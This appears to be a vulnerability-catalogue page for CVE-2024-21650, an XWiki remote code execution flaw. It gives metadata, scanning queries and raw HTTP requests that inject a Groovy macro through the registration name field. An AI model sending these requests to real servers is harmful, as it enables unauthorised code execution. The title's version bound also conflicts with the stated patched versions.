---
layout: "post"
cve_id: "CVE-2024-21650"
title: "XWiki < 4.10.20 - Remote code execution"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-21650.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-21650.yaml"
author: "ritikchaddha"
severity: "critical"
impact: "Successful exploitation could lead to remote code execution.
"
remediation: "This vulnerability has been patched in XWiki 14.10.17, 15.5.3 and 15.8 RC1.
"
reference:
  - "https://jira.xwiki.org/browse/XWIKI-21173"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-21650"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'cvss-score': 10.0, 'cve-id': 'CVE-2024-21650', 'cwe-id': 'CWE-95', 'epss-score': 0.92865, 'epss-percentile': 0.99756, 'cpe': 'cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 4, 'verified': True, 'vendor': 'xwiki', 'product': 'xwiki', 'shodan-query': 'html:"data-xwiki-reference"', 'fofa-query': 'body="data-xwiki-reference"'}"
tags:
  - "cve"
  - "cve2024"
  - "xwiki"
  - "rce"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
XWiki is vulnerable to a remote code execution (RCE) attack through its user registration feature. This issue allows an attacker to execute arbitrary code by crafting malicious payloads in the "first name" or "last name" fields during user registration. This impacts all installations that have user registration enabled for guests.


## ðŸŒ HTTP Request
```nohighlight
GET /bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fbin%252Fregister%252FXWiki%252FXWikiRegister%253Fxredirect%253D%25252Fxwiki%25252Fbin%25252Fview%25252FScheduler%25252F%25253Fdo%25253Dtrigger%252526which%25253DScheduler.NotificationEmailDailySender HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Safari/605.1.15
Connection: close
Content-Length: 588
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

parent=xwiki%3AMain.UserDirectory&register_first_name=%5D%5D%7B%7B%2Fhtml%7D%7D%7B%7Basync%7D%7D%7B%7Bgroovy%7D%7Dservices.logging.getLogger%28%22attacker%22%29.error%28%22Attack+succeeded%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D&register_last_name=LxLi9&xwikiname=DwNZiD&register_password=k21VOOMH&register2_password=k21VOOMH&register_email="38BJVREWiJwc1g0JNe62kXUUTLd%40JeQ9L.com&xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender&form_token=b1FJBR
```

```nohighlight
GET /xwiki/bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fbin%252Fregister%252FXWiki%252FXWikiRegister%253Fxredirect%253D%25252Fxwiki%25252Fbin%25252Fview%25252FScheduler%25252F%25253Fdo%25253Dtrigger%252526which%25253DScheduler.NotificationEmailDailySender HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /xwiki/bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15
Connection: close
Content-Length: 588
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

parent=xwiki%3AMain.UserDirectory&register_first_name=%5D%5D%7B%7B%2Fhtml%7D%7D%7B%7Basync%7D%7D%7B%7Bgroovy%7D%7Dservices.logging.getLogger%28%22attacker%22%29.error%28%22Attack+succeeded%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D&register_last_name=LxLi9&xwikiname=DwNZiD&register_password=k21VOOMH&register2_password=k21VOOMH&register_email="38BJVREWiJwc1g0JNe62kXUUTLd%40UPFua.com&xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender&form_token=b1FJBR
```

